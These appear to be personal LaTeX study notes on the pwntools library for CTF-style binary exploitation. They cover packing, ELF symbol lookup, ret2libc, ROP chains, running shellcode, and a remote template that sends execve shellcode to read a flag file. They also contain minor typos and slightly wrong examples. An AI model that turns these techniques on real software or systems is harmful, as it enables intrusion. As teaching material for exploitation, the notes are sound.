\section{shellcode with pwntools}

\url{https://tc.gts3.org/cs6265/2019/tut/tut03-02-pwntools.html}

\href{https://github.com/Gallopsled/pwntools-tutorial#readme}{pwntools-tutorial}

\url{https://github.com/nnamon/linux-exploitation-course/blob/master/lessons/3_intro_to_tools/lessonplan.md}

\subsection{Processes and Communication}
\subsubsection{Processes}
A process is the main way to interact with something in pwntools, and starting
one is easy.
\begin{verbatim}
p = process('./vulnerable_binary')
# or for a remote 
p = remote('my.special.ip', port)
\end{verbatim}

\subsubsection{Sending Data to Processes}
\begin{itemize}
    \item  \verb+p.send(data)+ Sends \verb+data+ to the process. Data can either be a
        string or a bytes-like object - pwntools handles it.
    \item  \verb+p.sendline(data)+: Sends \verb+data+ to the process followed
        by a newline character. (equiivalent to \verb-p.send(data + '\n')-)
\end{itemize}

\subsubsection{Receiving Data From Processes}
\begin{itemize}
    \item \verb+p.recv(numb)+: receive \verb+numb+ of bytes
    \item \verb+p.recvuntil(delimiter, drop=False)+: Receives all the data
        until it encounters the \verb+delimiter+, after which it returns the
        data. If drop is \verb+True+ then the returned data does not include
        the \verb+delimiter+.
    \item \verb+p.recvline(keepends=True)+: Essentially equivalent to
        \verb+p.recvuntil('\n', drop=keepends)+.  Receives up until a \verb+\n+
        is reached, then returns the data including the \verb+\n+ if keepends
        is \verb+True+.
    \item \verb+p.clean(timeout=0.02)+ Receives all data for timeout seconds
        and returns it. Another similar function is \verb+p.recvall()+, but
        this regularly takes far too long to execute so \verb+p.clean()+ is
        much better.
\end{itemize}

\subsection{Timeout}
All receiving functions all contain a timeout parameter as well as the other listed ones.
 For example, \verb+p.recv(numb=16, timeout=1)+ will execute but if \verb+numb+
 bytes are not received within \verb+timeout+ seconds the data is buffered for
 the next receiving function and an empty string \verb+''+ is returned.


 \subsection{Logging and Context}
 \subsubsection{Logging}
 Logging is a very useful feature of pwntools that lets you know where in your
 code you've gotten up to, and you can log in different ways for different
 types of data.
 \begin{itemize}
     \item \verb+log.info(text)+: 
         \begin{verbatim}
>>> log.info('Binary Base is at 0x400000')
[*] Binary Base is at 0x400000
         \end{verbatim}
     \item \verb+og.success(text)+
         \begin{verbatim}        
>>> log.success('ASLR bypassed! Libc base is at 0xf7653000')
[+] ASLR bypassed! Libc base is at 0xf7653000
         \end{verbatim}
    \item \verb+log.error(text)+
          \begin{verbatim}
>>> log.success('The payload is too long')
[-] The payload is too long
         \end{verbatim}
 \end{itemize}

 \verb+ld+ seems to have new by default protection regarding building elf from
shellcode.
add the following options  in
\verb+/usr/lib/python3.10/site-packages/pwnlib/asm.py+ to bypass that
\begin{verbatim}
linker_options = ['-z', 'execstack', '--no-warn-rwx-segments', '--no-warn-execstack']
\end{verbatim}

\subsubsection{Context}

\verb+context+ is a global variable in pwntools that allows to set certain
values once and all future functions automatically use that data.
\begin{verbatim}
context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.bits = 64
\end{verbatim}

Now every time you generate shellcode or use the \verb+p64()+ and \verb+u64()+
functions it will be specifically designed to use the context variables,
meaning it will just work.

the \verb+context+ can be grabbed automatically from the binary
\begin{verbatim}
context.binary = './vulnerable_binary'
# then it is possible to instantiate the process like this
p = process()
\end{verbatim}

\subsection{Packing}
Packing with the in-built python \verb+struct+ module is often a pain with
loads of unnecessary options to remember. pwntools makes this a breeze, using
the \verb+context+ global variable to automatically calculate how the packing
should work.

\subsubsection{p64(addr)}
Packs \verb+addr+ depending on \verb+context+, which by default is little-endian.
\begin{verbatim}
p64(0x04030201) == b'\x01\x02\x03\x04'

context.endian = 'big'
p64(0x04030201) == b'\x04\x03\x02\x01'
\end{verbatim}

note: \verb+p64()+ returns a bytes-like object, so you'll have to form your
padding as \verb+b'A'+ instead of just \verb+'A'+.

\subsubsection{u64(data)}

Unpacks \verb+data+ depending on \verb+context+; exact opposite of \verb+p64()+.

\subsubsection{flat(*args)}
Can take a bunch of arguments and packs them all according to context. The
\href{http://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.flat}{full
functionality} is quite complex, but essentially:
\begin{verbatim}
payload = flat(
    0x01020304,
    0x59549342,
    0x12186354
)
\end{verbatim}
is equivalent to:
\begin{verbatim}
payload = p64(0x01020304) + p64(0x59549342) + p64(0x12186354)
\end{verbatim}

\verb+flat()+ uses context, so unless you specify that it is 64 bits it will
attempt to pack it as 32 bits.


\subsection{ELF}

The pwntools \verb+ELF+ class is the most useful class you will probably ever
need, so understanding the full power of it will make your life easier.
Essentially, the \verb+ELF+ class allows you to look up variables at runtime
and stop hardcoding.

\subsubsection{Creating an ELF object}
\begin{verbatim}
elf = ELF('./vulnerable_program')
\end{verbatim}

\subsubsection{Getting a process}
Rather than specifying another process, we can just get it from the \verb+ELF+:
\begin{verbatim}
p = elf.process()
\end{verbatim}

\subsubsection{PLT and GOT}

\begin{verbatim}
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
\end{verbatim}

\subsubsection{Functions}
Need to return to a function called \verb+vuln+? Don't bother using a
disassembler or debugger to find where it is.
\begin{verbatim}
main_address = elf.functions['vuln']
\end{verbatim}
Note that \verb+elf.functions+ returns a \verb+Function+ object, so if you only
want the address you can use \verb+elf.symbols+:
\begin{verbatim}
main_address = elf.symbols['symbol']
\end{verbatim}

\subsubsection{elf.libc}
When local, we can grab the \verb+libc+ the binary is running with. Easy peasy.
\begin{verbatim}
libc = elf.libc
\end{verbatim}

\subsubsection{elf.search(needle, writable=False)}
Search the entire binary for a specific sequence \verb+needle+ of characters.
Very useful when trying to do a \verb+ret2libc+. If \verb+writable+ is set it
only checks for sections in memory that you can write to. Note this returns a
{\bf generator} so if you want the first match you have to enclose it in
\verb+next()+
\begin{verbatim}
binsh = next(libc.search(b'/bin/sh\x00'))
\end{verbatim}

\subsubsection{elf.address}
\verb+elf.address+ is the base address of the binary. If the binary does not
have PIE enabled, then it's absolute; if it does, all addresses are relative
(they pretend the binary base is \verb+0x0+).

Setting the \verb+address+ value automatically updates the address of
\verb+symbols+, \verb+got+, \verb+plt+ and \verb+functions+, which makes it
invaluable when adjusting for PIE or ASLR.

Let's say you leak the base address of \verb+libc+ while ASLR is enabled; with
pwntools, it's ridiculously easy to get the location of system for a
\verb+ret2libc+.
\begin{verbatim}
libc = elf.libc
libc.address = 0xf7f23000           # You 'leaked' this

system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))
exit_addr = libc.symbols['exit']

# Now you can do the ret2libc
\end{verbatim}


\subsection{ROP}

The \verb+ROP+ class is insanely powerful, enabling you to create readable ropchains in many less lines.

\subsubsection{Creating a ROP object}
\begin{verbatim}
rop = ROP(elf)
\end{verbatim}

\subsubsection{Adding padding}
\begin{verbatim}
rop.raw('A' * 64)
\end{verbatim}

\subsubsection{Adding a packed value}
\begin{verbatim}
rop.raw(0x12345678)
\end{verbatim}

\subsubsection{calling the function win}
\begin{verbatim}
rop.win()
# if you need parameters:
rop.win(0xdeadc0de, 0xdeadbeef)
\end{verbatim}


\subsubsection{Dumping the logic}
\begin{verbatim}
from pwn import *

elf = context.binary = ELF('./showcase')
rop = ROP(elf)

rop.win1(0x12345678)
rop.win2(0xdeadbeef, 0xdeadc0de)
rop.flag(0xc0ded00d)

print(rop.dump())
\end{verbatim}

\subsubsection{Sending the chain}
\begin{verbatim}
p.sendline(rop.chain())
\end{verbatim}

\subsubsection{Showcase}
Without pwntools:
\begin{verbatim}
payload = flat(
    POP_RDI,
    0xdeadc0de,
    elf.sym['win1'],
    POP_RDI,
    0xdeadbeef,
    POP_RSI,
    0x98765432,
    elf.sym['win2'],
    POP_RDI,
    0x54545454,
    elf.sym['flag']
)

p.sendline(payload)
\end{verbatim}

With pwntools:
\begin{verbatim}
rop.win1(0xdeadc0de)
rop.win2(0xdeadbeef, 0x98765432)
rop.flag(0x54545454)

p.sendline(rop.chain())
\end{verbatim}

\subsection{Extract Shellcode from an elf binary}
\begin{verbatim}
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section(".text")
print(shellcode.hex())
\end{verbatim}

\subsection{load and run shellcode}

\begin{verbatim}
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(unhex(sys.argv[1])).interactive()
\end{verbatim}


\subsection{Shellcode to binary}

\begin{verbatim}
#!/usr/bin/python3

import sys, os, stat
from pwn import *

context(os="linux", arch="amd64", log_level="error")

ELF.from_bytes(unhex(sys.argv[1])).save(sys.argv[2])
os.chmod(sys.argv[2], stat.S_IEXEC)
\end{verbatim}

\subsection{local binary exploit}
\url{https://docs.pwntools.com/en/stable/tubes/processes.html}

generate a template like :
\begin{verbatim}
$ pwntools-pwn template i<binary>
\end{verbatim}

or start simply:
\begin{verbatim}
#!/usr/bin/env python3

from pwn import *

def main():
    p = process("/bin/sh")
    p.interactive()

if __name__ == '__main__':
    main()
\end{verbatim}

\begin{verbatim}
./2_interactive
Welcome to the Super Secure Shell
Password: TheRealPassword
Correct password!
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),110(lxd),999(docker)
$ exit
\end{verbatim}


\subsection{Debugging with GDB}

\subsubsection{Manual approch}


Using the following script, we can print the process id before the interaction with the program happens.

\begin{verbatim}
    # Start a new process
    p = process("../build/3_reversing")
    # Print pid
    raw_input(str(p.proc.pid))

    p.send()
    ...
    p.interactive()

if __name__ == "__main__":
    main()
\end{verbatim}

with the pid it is possible to attach gdb
\begin{verbatim}
sudo gdb -p <pid>
\end{verbatim}

\subsubsection{Automated approch}
\href{http://docs.pwntools.com/en/stable/gdb.html}{here}


\subsection{Remote binary exploit}
\url{https://docs.pwntools.com/en/stable/tubes/sockets.html}

generate a template like :
\begin{verbatim}
$ pwntools-pwn template --host 159.65.63.151 --port 30138
\end{verbatim}

or
\begin{verbatim}
def main():
    # Start a local process
    p = remote("localhost", 1330)
    p.interactive()

if __name__ == "__main__":
    main()
\end{verbatim}

and edit the template to send / recv data from the target

\begin{verbatim}
io = start()
#gen = cyclic_gen()
#payload = gen.get(2000)
syscall = shellcraft.execve(path='/bin/cat',argv=['/bin/cat', '/flag.txt'])
print(syscall)
payload = asm(syscall).hex()
io.send(payload)
flag = io.recvline()
log.success(flag)

io.interactive()
\end{verbatim}


\section{notes}

\begin{verbatim}
    token = 0x41414141
    p.send(p32(token))
\end{verbatim}
\verb+p32()+ to pack integers into little
